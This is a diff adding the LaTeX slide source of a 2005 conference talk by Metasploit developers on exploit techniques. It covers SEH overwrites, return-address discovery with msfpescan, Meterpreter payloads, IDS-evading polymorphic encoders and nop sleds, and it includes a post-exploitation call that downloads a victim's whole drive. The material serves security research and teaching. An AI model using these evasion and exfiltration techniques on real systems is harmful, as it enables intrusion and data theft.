@@ -1,0 +1,1202 @@
+% $Header$
+
+\documentclass{beamer}
+\usepackage{graphicx}
+\usepackage{color}
+\usepackage{comment}
+
+\mode<presentation>
+{
+%  \usetheme{}
+  % or ...
+
+%  \usecolortheme{seahorse}
+%  \usecolortheme{crane}
+%  \useinnertheme{inmargin}
+
+%  \setbeamercovered{transparent}
+% or whatever (possibly just delete it)
+
+}
+
+\usepackage[english]{babel}
+\usepackage[latin1]{inputenc}
+\usepackage{times}
+\usepackage[T1]{fontenc}
+% \usepackage{beamerthemeshadow}
+
+% Love from spoon
+\newcommand{\pdfpart}[1]{\label{pdfpart-#1}\pdfbookmark[0]{#1}{pdfpart-#1}\part{#1}}
+\newenvironment{sitemize}{\vspace{1mm}\begin{itemize}\itemsep 4pt\small}{\end{itemize}}
+
+% Presentation meta-information
+\title{Advances in Exploit Technology}
+\author[hdm \& spoonm] {hdm \& spoonm}
+\date[CSW 2005] {CanSecWest, 2005}
+\subject{Advances in Exploit Technology}
+
+% Add a spacer between each part
+\AtBeginPart{\frame{\partpage}}
+
+% Turn off the navigation on the bottom yo
+\setbeamertemplate{navigation symbols}{}
+
+% Kick this sucker open
+\begin{document}
+
+% Throw down the title
+\begin{frame}[t]
+  \titlepage
+\end{frame}
+
+
+%--------------------------------------%
+\pdfpart{Introduction}
+%--------------------------------------%
+
+\section{Who are we?}
+\begin{frame}[t]
+	\frametitle{Who are we?}
+
+	\begin{sitemize}
+		\item spoonm
+		\begin{sitemize}
+			\item Full-time student at a Canadian university
+			\item Metasploit developer since late 2003
+		\end{sitemize}
+	\end{itemize}
+
+	\begin{itemize}
+		\item H D Moore
+		\begin{sitemize}
+			\item Full-time employee at a network security firm
+			\item Metasploit project founder and developer
+		\end{sitemize}		
+	\end{sitemize}
+\end{frame}
+
+\section{What is Metasploit?}
+\begin{frame}[t]
+  \frametitle{What is Metasploit?}
+	\begin{sitemize}
+		\item Research project with 8 members 
+		\begin{sitemize}
+			\item Focused on improving the state of security
+			\item Provide information and tools for researchers
+			\item Resource for IDS and security tool vendors
+		\end{sitemize}
+	\end{sitemize}
+	
+	\begin{sitemize}			
+		\item Created the Metasploit Framework
+		\begin{sitemize}
+			\item Open-source exploit dev platform
+			\item Includes 60 exploits and 70 payloads
+			\item Implements ideas from everywhere
+			\item Currently four primary developers
+			\item Handful of external contributors
+		\end{sitemize}
+	\end{sitemize}
+\end{frame}
+
+\section{What is this about?}
+\begin{frame}[t]
+  \frametitle{What is this about?}
+	\begin{sitemize}
+		\item Recent advances in exploit technology
+		\item Exploit development trends and XP SP2
+		\item Interesting post-exploitation techniques	
+		\item Improving the exploit randomness
+		\item Metasploit Framework 3.0 architecture
+	\end{sitemize}  
+\end{frame}
+
+
+%--------------------------------------%
+\pdfpart{Windows Exploitation}
+%--------------------------------------%
+
+\section{Exploit Trends}
+\begin{frame}[t]
+  \frametitle{Exploit Trends}
+	\begin{sitemize}
+		\item Public Windows exploits are still terrible...		
+		\begin{sitemize}
+			\item Tons of ugly, inflexible, hardcoded crap
+			\item Demonstrate no knowledge of underlying flaw
+			\item Rarely use information leakage for system targetting
+		\end{sitemize}
+	\end{sitemize}
+	
+	\pause
+	\begin{sitemize}	
+		\item ...but they have improved over the last year!
+		\begin{sitemize}
+			\item More exploits are supporting multiple payloads
+			\item Return addresses are more reliable
+			\item Payloads are getting slightly less ghetto
+		\end{sitemize}
+	\end{sitemize}  
+\end{frame}
+
+\begin{frame}[t]
+  \frametitle{PoC Community}
+	
+	\begin{sitemize}
+		\item The number of people capable of writing exploits is going up...
+		\begin{sitemize}
+			\item Nearly 250 PoC authors in 2004 (packetstorm, etc)
+			\item Win32 exploit dev information has hit critical mass
+			\item Exploit development training is in high demand
+		\end{sitemize}	
+	\end{sitemize}
+	
+	\pause
+	\begin{sitemize}
+		\item ...but the number of "hard" exploits made public is the same
+		\begin{sitemize}
+			\item People are lazy, skilled people tend to horde their code
+			\item Example: Microsoft ASN.1 Bit String Heap Corruption
+			\item Most "difficult" exploits are disclosed due to leaks
+			\item Win32 kernel exploits are still the domain of a few :-)
+		\end{sitemize}
+	\end{sitemize}
+\end{frame}
+
+\section{Windows XP SP2}
+\begin{frame}[t]
+  \frametitle{Windows XP SP2}
+	\begin{sitemize}
+		\item Microsoft's "patch of the year" for 2004
+		\begin{sitemize}
+			\item SP2 included a handful of anti-exploit changes
+			\item The important ones were already in 2003
+			\begin{sitemize}
+				\item Use of registered system exception handlers
+				\item Core services compiled with stack protection
+			\end{sitemize}
+			\item Page protection is still dependent on hardware
+		\end{sitemize}	
+	\end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+  \frametitle{Metasploit and SP2}
+	\begin{sitemize}
+		\item Exploit development barely affected by SP2
+		\item A handful of XP SP2 and 2003 SEH return addresses
+		\item Third-parties are not using Visual Studio 7
+		\begin{sitemize}
+			\item Most commercial applications do not use /GS
+			\item Have yet to see one that uses Registered SEH
+		\end{sitemize}
+	\end{sitemize}
+\end{frame}
+
+
+\begin{comment}
+%--------------------------------------%
+\pdfpart{Mac OS X Exploitation}
+%--------------------------------------%
+
+\section{PowerPC Processor}
+\begin{frame}[t]
+	\frametitle{PowerPC Contraints}
+	\begin{sitemize}
+		\item Mac OS X runs on the PowerPC processor
+		\begin{sitemize}
+			\item PowerPC uses fixed-width 32-bit instructions
+			\item Data and instruction caches are independent
+			\item The instruction cache runs in "incoherent" mode
+		\end{sitemize}
+		\pause	
+	
+		\item Stack overflows need to return twice to be exploitable
+		\item (Similar to exploits on SPARCs, etc)
+	\end{sitemize}
+\end{frame}
+
+%%%% FIXME
+% These two slides repeat the same 3 bullets or something...
+% Also, talk about your new flush foo!
+%%%%
+
+\section{Exploits are annoying}
+\begin{frame}[t]
+	\frametitle{Exploits are annoying }
+	\begin{sitemize}
+		\item Double-return means having to patch other pointers
+		\item Code which calls \_exit before sometimes unexploitable
+		\item Shellcode must be placed into location not in i-cache
+		\item Exploits can have different results between diff CPUs
+	\end{sitemize}
+\end{frame}
+
+\section{Shellcode issues}
+\begin{frame}[t]
+	\frametitle{Shellcode issues }
+	\begin{sitemize}
+		\item Double-return means having to patch other pointers
+		\item Shellcode must be placed into location not in i-cache
+		\item Exploits can have different results between diff CPUs
+	\end{sitemize}
+\end{frame}
+\end{comment}
+
+%--------------------------------------%
+\pdfpart{Return Addresses}
+%--------------------------------------%
+
+\section{Reliability}
+\begin{frame}[t]
+	\frametitle{Return Address Reliability}
+	\begin{sitemize}
+		\item An exploit is only as good as the return address it uses
+		\item Many vulnerabilities only allow one exploit attempt
+		\item Returning directly to shellcode is not always possible
+		\begin{sitemize}
+			\item Most Windows exploits use a "bounce" address
+			\item Indirect returns are useful on other platforms as well
+		\end{sitemize}
+	\end{sitemize}	
+\end{frame}
+
+\section{Windows Addresses}
+\begin{frame}[t]
+	\frametitle{Windows Return Addresses}
+	\begin{sitemize}
+		\item Windows stack addresses are usually not predictable
+		\item Executable and library addresses {\em are} predictable
+		\begin{sitemize}
+			\item System libraries are often static between patch levels
+			\item Application libraries change even less frequently
+			\item Executable addresses only change between app versions
+		\end{sitemize}
+	\end{sitemize}
+	
+	\begin{sitemize}
+		\item Static system libraries can go a long way...
+		\pause
+		\item A great example is the "ws2help.dll" library:
+		\begin{sitemize}
+			\item Static across all versions of Windows 2000
+			\item Static across Windows XP SP0 and SP1
+			\item Used in dozens of exploits in the Framework
+		\end{sitemize}
+	\end{sitemize}	
+\end{frame}
+
+\begin{frame}[fragile]
+	\frametitle{The Magic SEH}
+	\begin{sitemize}
+		\item Stack overflows rarely exploit return address overwrites
+		\item Overwriting the structured exception handler (SEH) is easier
+		\item The first exception causes smashed SEH to be called
+		\item SEH frame can exist before or after the return address
+	\end{sitemize}
+{\footnotesize 
+	\begin{verbatim}
+/* Struction Exception Handler */
+typedef struct _EXCEPTION_REGISTRATION
+{
+	struct _EXCEPTION_REGISTRATION* prev;
+	PEXCEPTION_HANDLER              handler;
+} EXCEPTION_REGISTRATION, *PEXCEPTION_REGISTRATION;
+	\end{verbatim}
+}
+\end{frame}
+
+
+\begin{frame}[fragile]
+	\frametitle{The Magic SEH}
+	\begin{sitemize}
+		\item Overwrite the frame, trigger exception, got EIP :-)
+		\item The prototype for the SEH function is:
+	\end{sitemize}
+{\footnotesize 	
+	\begin{verbatim}
+EXCEPTION_DISPOSITION
+	__cdecl _except_handler(
+		 struct _EXCEPTION_RECORD *ExceptionRecord,
+		 void * EstablisherFrame,
+		 struct _CONTEXT *ContextRecord,
+		 void * DispatcherContext );
+	\end{verbatim}
+}
+	\pause
+	\begin{sitemize}
+		\item \texttt{EstablisherFrame} points 4 bytes before handler address
+		\pause
+		\item Passed to exeception handler function \texttt{[esp+8]}
+		\pause
+		\item Return back to code via \texttt{pop reg, pop reg, ret}
+		\pause
+		\item The pop + pop + ret combination is easy to find in memory
+		\pause
+		\item Registered SEH and Windows XP/2003 limit this type of abuse
+	\end{sitemize}
+\end{frame}
+
+\section{Unix Addresses}
+\begin{frame}[t]
+	\frametitle{Unix Return Addresses}
+	
+	\begin{sitemize}
+		\item Linux and BSD	
+		\begin{sitemize}
+			\item Library addresses are usually not predictable
+			\item Every executable has a static load address
+			\begin{sitemize}
+				\item Every distribution compiles its own binaries
+				\item Exploits must target specific versions and operating systems
+				\item Commercial (binary-only) applications are mostly static
+			\end{sitemize}
+		\end{sitemize}
+	\end{sitemize}
+	
+	\pause
+	\begin{sitemize}
+		\item Commercial Unix
+		\begin{sitemize}
+			\item Library addresses are sometimes predictable
+			\item Every executable has a static load address
+			\begin{sitemize}
+				\item These addresses are static per package version
+				\item Windows-style return addresses work well
+				\item This includes Mac OS X, Solaris, HP-UX, AIX, etc
+			\end{sitemize}
+		\end{sitemize}
+	\end{sitemize}
+\end{frame}
+
+
+
+\section{Analysis Tools}
+\begin{frame}[t]
+	\frametitle{Analysis Methods}
+	\begin{sitemize}
+		\item Finding solid return addresses involves a few steps
+		\begin{sitemize}
+			\item Load the executable or library into memory
+			\item Determine all permutations of the desired opcode
+			\item Search memory contents to find these bytes
+			\item Determine the virtual address for each offset
+		\end{sitemize}		
+	\end{sitemize}
+	
+	\pause
+	\begin{sitemize}
+		\item Many people use a debugger to accomplish this task
+		\begin{sitemize}
+			\item This is a tedious process to do manually
+			\item Limited to one version at a time, even with a plugin
+			\item Requires the installation of each tested version
+		\end{sitemize}
+	\end{sitemize}	
+\end{frame}
+
+\begin{frame}[t]
+	\frametitle{msfpescan}
+	\begin{sitemize}
+		\item msfpescan - a utility included in the Metasploit Framework
+		\begin{sitemize}
+			\item Can analyze any PE executable or DLL in offline mode
+			\item Simple to automate and cross-reference results
+			\item Does not require a Windows system to run
+			\item Easily analyze multiple versions on the command line
+			\item Capable of dumping other information as well
+			\begin{sitemize}
+				\item Imports, Exports, and IAT addresses
+				\item Resource information, internal versions
+				\item Standard PE header information
+			\end{sitemize}
+		\end{sitemize}		
+	\end{sitemize}
+\end{frame}
+
+\begin{frame}[fragile]
+	\frametitle{Using msfpescan to find addresses}
+	\begin{sitemize}
+		\item Install the Metasploit Framework (2.3 or newer)
+		\item Place your target executable or DLL into some directory
+		\item Use msfpescan to quickly find return addresses:
+	\end{sitemize}
+
+{\footnotesize 
+\begin{verbatim}
+		# Locate any form of pop/pop/ret opcodes
+		$ msfpescan -f mod_oiplus.dll -s
+		0x1001413c   esi edi ret
+		0x10009ea2   esi ecx ret	
+		0x100113bd   esi ebx ret
+
+		# Locate any opcodes that take us to [eax]
+		$ msfpescan -f mod_oiplus.dll -j eax
+		0x1000969d   push eax
+		0x100141a3   jmp eax
+		0x10010e69   call eax
+\end{verbatim} 
+}
+\end{frame}
+
+\begin{frame}[t]
+	\frametitle{Opcode Databases}
+	\begin{sitemize}
+		\item Contains opcodes across every executable and DLL in Windows
+		\item The new version includes over nine million records
+		\item Data is generated directly from the files themselves
+		\item Quickly cross-reference return addresses over the entire DB
+		\item Publicly available from http://www.metasploit.com/
+	\end{sitemize}	
+\end{frame}
+
+\begin{frame}[t]
+	\frametitle{Future Development}
+	\begin{sitemize}
+		\item Context-aware return address discovery
+		\begin{sitemize}
+			\item Demonstrated by eEye at Black Hat 2004
+			\item Similar project in development from Metasploit
+		\end{sitemize}
+	\end{sitemize}
+	\pause
+	
+	\begin{sitemize}
+		\item Executable analysis tools for Solaris, Mac OS X, Linux, BSD
+		\begin{sitemize}
+			\item Usefulness limited compared to Windows platform
+			\item Static libraries are great for cross-version exploits
+		\end{sitemize}
+	\end{sitemize}	
+\end{frame}
+
+
+%--------------------------------------%
+\pdfpart{Post-Exploitation}
+%--------------------------------------%
+
+\section{Windows Payloads}
+
+\begin{frame}[t]
+	\frametitle{The Meterpreter}
+	\begin{sitemize}
+		\item Windows version uses in-memory DLL injection techniques
+		\item Dynamically extensible over the network
+		\item Extensions are standard Windows DLLs
+		\item Loading an extension updates available commands
+		\item Support for network encryption
+		\item Huge feature set in the public version
+		\begin{sitemize}
+			\item Upload, download, and list files
+			\item List, create, and kill processes
+			\item Spawn "channelized" commands in the background
+			\item Create port forwarding channels to pivot attacks
+		\end{sitemize}
+	\end{sitemize}	
+\end{frame}
+
+\begin{frame}[t]
+	\frametitle{Ordinal-based Payload Stagers}
+	\begin{sitemize}
+		\item Techniques borrowed from Oded's lightning talk from core04
+		\item 92 bytes and works on every Windows OS and SP
+		\item Staging system can chain any other Windows payload
+		\item Implementation also has a few size reductions:
+		\begin{sitemize}
+			\item Optimized module walked finds ws2\_32.dll
+			\item Functions are loaded from base + ordinal offset
+			\item Chained calls return to the next function
+		\end{sitemize}	
+	\end{sitemize}	
+\end{frame}
+
+\begin{frame}[t]
+	\frametitle{PassiveX}
+	\begin{sitemize}
+		\item Payload modifies registry and launches IE
+		\item IE loads custom ActiveX control to stage the payload
+		\item Communications channel is via HTTP requests
+		\begin{sitemize}
+			\item Uses standard IE proxy and auth settings
+			\item Useful on heavily firewalled DMZ hosts
+			\item Providers bi-directional channel for next stage
+		\end{sitemize}
+	\end{sitemize}
+	
+	\begin{sitemize}
+		\item Can be used to inject VNC, Meterpreter, etc
+		\item Fully-functional and part of version 2.4
+	\end{sitemize}	
+\end{frame}
+
+
+\section{Unix Payloads}
+
+\begin{frame}[t]
+	\frametitle{Other Network Stagers}
+	\begin{sitemize}
+		\item UDP-based stager and network shell for Linux
+		\item UDP-based DNS request staging system
+		\begin{sitemize}
+			\item UDP shell depends on the bash --noediting option
+			\item Can pass through strict firewall rulesets
+		\end{sitemize}
+	\end{sitemize}
+	
+	\begin{sitemize}	
+		\item ICMP-based listener and "reverse" payloads
+		\item Findsock stagers being replaced by "findrecvtag"
+		\item Source code included in Metasploit Framework
+	\end{sitemize}	
+\end{frame}
+
+
+
+%--------------------------------------%
+\pdfpart{Improving Attack Randomness}
+%--------------------------------------%
+
+%\begin{frame}[t]
+%  \frametitle{Outline}
+%  \tableofcontents
+%\end{frame}
+
+\section{Introduction}
+\begin{frame}[t]
+  \frametitle{Introduction}
+  
+  \begin{sitemize}
+    \item Randomness, who cares?
+    \begin{sitemize}
+      \item Make IDS analysts work for their paycheck
+      \item Uncover flaws in your exploit code
+    \end{sitemize}
+    \pause
+  \end{sitemize}
+  
+  \begin{sitemize}  
+	\item Adding randomness to exploit code
+    \begin{sitemize}
+      \item Modify attacks by setting protocol options
+      \item Randmomize all padding and non-critical data
+      \item Helper functions for different types of random data
+    \end{sitemize}
+	\pause
+  \end{sitemize}
+  
+  \begin{sitemize} 
+    \item Adding randomness to machine code
+    \begin{sitemize}
+      \item Avoid "static" payload encoding systems
+      \item Substitute like instructions and reorder tasks
+      \item Randomize nop sleds and any other opcode fills
+    \end{sitemize}
+  \end{sitemize}
+  
+\end{frame}
+
+\begin{frame}[t]
+  \frametitle{Polymorphism}
+  \begin{sitemize}
+    \item Viruses morphed to evade signature anti-virus
+    \item Shellcode doesn't morph, isn't really polymorphic
+    \item Generators produce functionally equivalent permutations
+    \item Simple examples: random 0x90 nops, add/sub switching
+  \end{sitemize}
+\end{frame}
+
+\section{Conservative "Polymorphism"}
+
+\subsection{CLET}
+
+% clet was in phrack 61..
+\begin{frame}[t]
+  %%
+  \frametitle{CLET}
+  %%
+  \begin{sitemize}
+    \item Generates permutations of decoder stubs
+    \item Inserts reversing instructions, nop equivalents
+    \item All decoders are C code to generate themselves
+    \pause
+    \item Pros:
+    \begin{sitemize}
+      \item Well thought out - analyzed attacks against NIDS
+      \item Mathematica files output, mathy backing
+      \item Specturm analysis - push sled to byte distribution
+    \end{sitemize}
+    \pause
+    \item Cons:
+    \begin{sitemize}
+      \item Complicated system, really hard to build upon
+      \item Decoder generation isn't that great
+      \item Making compromises for size/robustness
+    \end{sitemize}
+  \end{sitemize}
+\end{frame}
+
+\subsection{Pex::Poly}
+
+\begin{frame}[t]
+  %%
+  \frametitle{Metasploit Pex::Poly}
+  %%
+  \begin{sitemize}
+    \item "Conservative Polymorphism"
+    \item Uses the inherit variability in shellcode
+    \pause
+    \item Pros:
+    \begin{sitemize}
+      \item Polymorphizing code is pretty easy
+      \item No size or functionality compromises
+      \item Bad character and register avoidence
+    \end{sitemize}
+    \pause
+    \item Cons:
+    \begin{sitemize}
+      \item Less thought out, NIDS attacks not deeply analyzed
+      \item Hard to push to arbitrary byte distribution
+      \item Less "polymorphism", more restrictions
+    \end{sitemize}
+  \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+  \frametitle{Implementation - Pex::Poly}
+  \begin{sitemize}
+    \item "Blocks" are dependency graph nodes
+    \item "Blocks" consist of 0 or more possibilities
+    \item Register pool assignment (mov reg1, reg2)
+    \item Gained robustness as a nice effect
+    \pause
+    \item Current implementation
+    \begin{sitemize}
+      \item Current system is a bit ugly
+      \item Hard without writing a real assembler
+      \item Want it to be fairly fast
+      \pause
+      \item Pex::Poly has 3 phases
+      \item Dependency iteration and block selection
+      \item Instruction offset calculations
+      \item Instruction register assignment
+    \end{sitemize}
+  \end{sitemize}
+\end{frame}
+
+\subsection{Shikata Ga Nai}
+
+\begin{frame}[t]
+  \frametitle{Shikata Ga Nai}
+  \begin{sitemize}
+    \item It's too much work to polyize every payload
+    \item Created one decent "polymorphic" encoder
+    \pause
+    \item Noir's FPU geteip technique
+    \item Approximately 1.3 million permutations
+    \item Additive feedback xor, encodes it's own end
+    \item 27 bytes for the stub, 4 key, 4 encoded
+  \end{sitemize}
+\end{frame}
+
+\newcommand{\incshi}[1]{\includegraphics[height=3in]{#1}}
+
+\begin{frame}[t]
+  \frametitle{Shikata dependency iteration}
+  \only<9>{\incshi{shi8}}
+  \only<8>{\incshi{shi7}}
+  \only<7>{\incshi{shi6}}
+  \only<6>{\incshi{shi5}}
+  \only<5>{\incshi{shi4}}
+  \only<4>{\incshi{shi3}}
+  \only<3>{\incshi{shi2}}
+  \only<2>{\incshi{shi1}}
+  \only<1>{\incshi{shi0}}
+\end{frame}
+
+\begin{frame}[fragile]
+  \frametitle{Example output}
+
+\begin{onlyenv}<1>
+\begin{verbatim}
+00000000  BB6E887A69        mov ebx,0x697a886e
+00000005  DDC4              ffree st4
+00000007  D97424F4          fnstenv [esp-0xc]
+0000000B  58                pop eax
+0000000C  29C9              sub ecx,ecx
+0000000E  B101              mov cl,0x1
+00000010  83E8FC            sub eax,byte -0x4
+00000013  31580E            xor [eax+0xe],ebx
+00000016  03580E            add ebx,[eax+0xe]
+00000019  E2F5              loop 0x10
+\end{verbatim}
+\end{onlyenv}
+
+\begin{onlyenv}<2>
+\begin{verbatim}
+00000000  DBC1              fcmovnb st1
+00000002  31C9              xor ecx,ecx
+00000004  B101              mov cl,0x1
+00000006  D97424F4          fnstenv [esp-0xc]
+0000000A  5B                pop ebx
+0000000B  BAC8E2C8F8        mov edx,0xf8c8e2c8
+00000010  83C304            add ebx,byte +0x4
+00000013  315313            xor [ebx+0x13],edx
+00000016  035313            add edx,[ebx+0x13]
+00000019  E2F5              loop 0x10
+\end{verbatim}
+\end{onlyenv}
+
+\begin{onlyenv}<3>
+\begin{verbatim}
+00000000  BB7B833BB9        mov ebx,0xb93b837b
+00000005  DAC0              fcmovb st0
+00000007  D97424F4          fnstenv [esp-0xc]
+0000000B  2BC9              sub ecx,ecx
+0000000D  5E                pop esi
+0000000E  B101              mov cl,0x1
+00000010  315E12            xor [esi+0x12],ebx
+00000013  83C604            add esi,byte +0x4
+00000016  03                db 0x03
+00000017  25                db 0x25
+00000018  8D                db 0x8D
+00000019  D9                db 0xD9
+0000001A  4C                dec esp
+\end{verbatim}
+\end{onlyenv}
+
+\end{frame}
+
+\section{Building a Nop Sled}
+
+\subsection{Tekneek}
+
+\begin{frame}[t]
+  \frametitle{Multibyte Nop Sled Concept}
+  \begin{sitemize}
+    \item Optyx released multibyte nop generator at Interz0ne 1
+    \item Generates instructions 1 to 6 bytes long, and uses 0x66 prefix
+    \item Aligned to 1 byte, land anywhere, end up at the final target
+  \end{sitemize}
+  \begin{sitemize}
+    \pause
+    \item Builds the sled from back to front
+    \item Prepends to the sled 1 byte at a time
+    \item Generates a random byte and checks against tables
+    \pause
+    \begin{sitemize}
+      \item Is the instruction length too long?
+      \item Is it a valid instruction?
+      \item Does it have any bad bytes?
+      \item Does it modify restricted registers?
+    \end{sitemize}
+  \end{sitemize}
+\end{frame}
+
+\begin{frame}[fragile]
+  \frametitle{Backwardz}
+  {\footnotesize
+  \begin{semiverbatim}
+  \textbf<11>{bb} \textbf<10,11>{b0} \textbf<9,10,11>{bf} \textbf<8,9,11>{2c} \textbf<7,8,9,11>{b6} \textbf<6,7,9>{27} \textbf<5,9>{67} \textbf<4,5>{2F} \textbf<3>{4A} \textbf<2>{1b} \textbf<1,2>{f9} --- shellcode
+  |  |  |  |  |  |  |  |  |  |  | \textbf<1>{... stc}
+  |  |  |  |  |  |  |  |  |  |____^ \textbf<2>{. sbb edi,ecx}
+  |  |  |  |  |  |  |  |  | \textbf<3>{......... dec edx}
+  |  |  |  |  |  |  |  | \textbf<4>{............ das}
+  |  |  |  |  |  |  |____^ \textbf<5>{.......... a16 das}
+  |  |  |  |  |  | \textbf<6>{.................. daa}
+  |  |  |  |  |____^ \textbf<7>{................ mov dh, 0x27}
+  |  |  |  |____^ \textbf<8>{................... sub al, 0xb6}
+  |  |  |_____________^ \textbf<9>{............. mov edi, 0x6727b62c}
+  |  |____^ \textbf<10>{......................... mov al, 0xbf}
+  |_____________^ \textbf<11>{................... mov ebx, 0xb62cbfb0}
+\end{semiverbatim}
+}
+\end{frame}
+
+\subsection{Implementation}
+
+\begin{frame}
+  \frametitle{OptyNop2 Implementation}
+  \begin{sitemize}
+    \item Generate random byte and check against tables
+    \begin{sitemize}
+      \item Inefficent, hard to get even distributions
+    \end{sitemize}
+    \pause
+
+    \item Generate random byte and check against disassembler
+    \begin{sitemize}
+      \item Need a good disassembler
+      \item Same problems as tables
+    \end{sitemize}
+    \pause
+
+    \item Precompiled state transition tables
+    \begin{sitemize}
+      \item Previous byte: 0x90 -> \{0x04, 1, EAX\} ... \# add al,0x90
+      \pause
+      \item Fairly language independent, C version 100 lines
+      \item Very fast, simple, deterministic
+      \item Allows for different scoring systems, recursion...
+      \pause
+      \item Can't support multibyte opcodes, escape groups, etc
+      \item Tables are pretty large, about 124k
+    \end{sitemize}
+
+  \end{sitemize}
+\end{frame}
+
+\begin{frame}[fragile]
+  \frametitle{OptyNop2 Output}
+  {\footnotesize
+  \begin{verbatim}
+$ ./waka 1000 4 5 | ndisasm -u - | head -700 | tail -20
+000003B6  05419F40D4        add eax,0xd4409f41
+000003BB  711C              jno 0x3d9
+000003BD  9B                wait
+000003BE  2C98              sub al,0x98
+000003C0  37                aaa
+000003C1  24A8              and al,0xa8
+000003C3  27                daa
+000003C4  E00D              loopne 0x3d3
+000003C6  6692              xchg ax,dx
+000003C8  2F                das
+000003C9  49                dec ecx
+000003CA  B34A              mov bl,0x4a
+000003CC  F5                cmc
+000003CD  BA4B257715        mov edx,0x1577254b
+000003D2  700C              jo 0x3e0
+000003D4  C0D6B0            rcl dh,0xb0
+000003D7  A9FD469342        test eax,0x429346fd
+000003DC  67BBB191B23D      a16 mov ebx,0x3db291b1
+000003E2  1D9938FCB6        sbb eax,0xb6fc3899
+000003E7  43                inc ebx
+\end{verbatim}
+}
+
+\end{frame}
+
+\subsection{Analysis}
+
+\begin{frame}[fragile]
+  \frametitle{ADMmutate Distribution - 1}
+  \include{admtable}
+\end{frame}
+\begin{frame}[fragile]
+  \frametitle{ADMmutate Distribution - 2}
+  \include{admtable2}
+\end{frame}
+\begin{frame}[fragile]
+  \frametitle{OptyNop2 Distribution - 1}
+  \include{optytable}
+\end{frame}
+\begin{frame}[fragile]
+  \frametitle{OptyNop2 Distribution - 2}
+  \include{optytable2}
+\end{frame}
+
+\begin{frame}[fragile]
+  \frametitle{ADMmutate and optyx-mutate Gzip'd}
+  {\footnotesize
+  \begin{verbatim}
+# ADMmutate
+
+$ time ./nops 1000000| gzip -v >/dev/null
+ 27.3%
+real    0m0.241s
+
+# optyx's interz0ne mutate
+
+$ time ./driver nop 1000000 | gzip -v >/dev/null
+ 29.7%
+real    0m0.467s
+\end{verbatim}
+}
+\end{frame}
+
+\begin{frame}[fragile]
+  \frametitle{OptyNop2 Gzip'd}
+  {\footnotesize
+  \begin{verbatim}
+# C version, save ESP and EBP
+
+$ time ./waka 1000000 4 5 | gzip -v >/dev/null
+ 12.2%
+real    0m11.900s
+
+# save just ESP
+
+$ time ./waka 1000000 4 | gzip -v >/dev/null
+ 11.7%
+real    0m11.277s
+
+# save nothing (good way to crash process)
+
+$ time ./waka 1000000 | gzip -v >/dev/null
+  8.3%
+real    0m12.404s
+\end{verbatim}
+}
+\end{frame}
+
+\subsection{Conclusion}
+\begin{frame}[t]
+  %%
+  \frametitle{Conclusion}
+  %%
+
+  \begin{sitemize}
+  \item Benefits
+  \begin{sitemize}
+    \item Handles restricted bytes and registers
+    \item More versatile sled generation (nop stuffing, etc)
+    \item Implementation and theory are simple
+  \end{sitemize}
+  \end{sitemize}
+
+  \pause
+
+  \begin{sitemize}
+  \item Possible Improvements
+  \begin{sitemize}
+    \item Support processor flags (nop stuffing)
+    \item Support 2-byte opcodes and escape groups
+    \item Improved byte scoring systems and look-ahead
+    \item Output according to a given byte distribution
+    \item Reduce the table sizes, memory usage
+  \end{sitemize}
+  \end{sitemize}
+\end{frame}
+
+
+%--------------------------------------%
+\pdfpart{Metasploit Framework 3.0}
+%--------------------------------------%
+
+\section{Introduction}
+
+\begin{frame}[t]
+  %%
+  \frametitle{Lessons learned}
+  %%
+  
+  \begin{sitemize}
+    \item "Hackers" run 98\% win32, 2\% linux/bsd/osx
+    \item Portability sucks, win32 sucks, and cygwin sucks
+  \end{sitemize}
+  \pause
+  \begin{sitemize}
+    \item Version 2.x is difficult to automate
+    \item Everyone wants a completely automatic hack tool...
+    \pause
+    \item ...Everyone else will hate us if we write one
+  \end{sitemize}
+  \pause
+  \begin{sitemize}
+    \item External contributors inversely proportional to user base
+    \item The ones who complain the loudest contribute the least
+    \pause
+    \item Don't pick your language in hopes of contributions
+    \item Perl is falling short as we grow more complex
+  \end{sitemize}
+  \pause
+  \begin{sitemize}
+    \item Metasploit 2.0 mostly designed around exploits
+    \item Payloads have grown more important and complex
+  \end{sitemize}
+  
+\end{frame}
+
+\section{Architecture}
+\subsection{Introduction}
+
+\begin{frame}[t]
+  \frametitle{Metasploit 3.0 goals}
+  
+  \begin{sitemize}
+    \item A capable language we \emph{enjoy} writing in
+    \begin{sitemize}
+      \item Portability less important, support major OS's
+    \end{sitemize}
+    \pause
+    \item Embeddable for use in other tools
+    \pause
+    \item Strong custom automation
+    \begin{sitemize}
+      \item Test suites for the framework itself
+      \item Ability to test defensive infrastructure
+    \end{sitemize}
+    \pause
+    \item Staged payloads as first class citizens
+    \pause
+    \item "Pivoting" through owned hosts
+    \pause
+    \item Thread designed, not just thread safe
+  \end{sitemize}
+\end{frame}
+
+\subsection{Ruby to the rescue}
+
+\begin{frame}[t]
+  \frametitle{We love Ruby}
+  \begin{sitemize}
+    \item Used for our prototypes, leading candidate for msf3
+    \item Clean, simple language and easy to learn
+    \item Strong object model, and we use every inch
+    \pause
+    \item Library support is decent, often better than Perl
+    \item Native Win32 builds, cygwin as backup
+    \item 2.x will stay Perl and continue in parallel
+  \end{sitemize}
+\end{frame}
+
+\subsection{Embedding}
+
+\begin{frame}[t]
+  \frametitle{Metasploit embedded}
+  \begin{sitemize}
+    \item Metasploit: A hacker tool framework
+    \pause
+    \item Tools built upon "framework-core" libraries
+    \item Clear and documented SDK and interfaces
+    \pause
+    \item Similar 2.x interfaces written by us
+    \item Automation tools written by you
+  \end{sitemize}
+\end{frame}
+
+
+\begin{frame}[t, fragile]
+  \frametitle{Payload model}
+  \begin{sitemize}
+    \item Payloads subscribe to unified API layers
+    \item APIs emulate and extend the native Ruby APIs
+    \item Port existing applications to be remote with no changes
+    \item Great for scripting, great for testing
+    \pause
+    \item Better post-exploitation tools, more fun
+    \begin{sitemize}
+      \item Mirror victims harddrive:
+\begin{verbatim}
+client.fs.dir.download('./victim', 'c:\\', true)
+\end{verbatim}
+      \pause
+      \item Migrate to a different process
+\begin{verbatim}
+pid = client.sys.process['calc.exe']
+client.core.migrate(pid)
+\end{verbatim}
+      \pause
+      \item Socket support, inefficent network pivoting
+      \pause
+      \item Support for Unix too, improved tools on their way
+    \end{sitemize}
+  \end{sitemize}
+\end{frame}
+
+\subsection{Other...}
+
+\begin{frame}[t]
+  %%
+  \frametitle{Other Stuff}
+  %%
+
+  \begin{sitemize}
+    \item Threading
+    \begin{sitemize}
+      \item Ruby threads will work in theory
+      \item Meterpreter protocol asynchronous
+      \item Hopefully you can hack the planet in parallel
+    \end{sitemize}
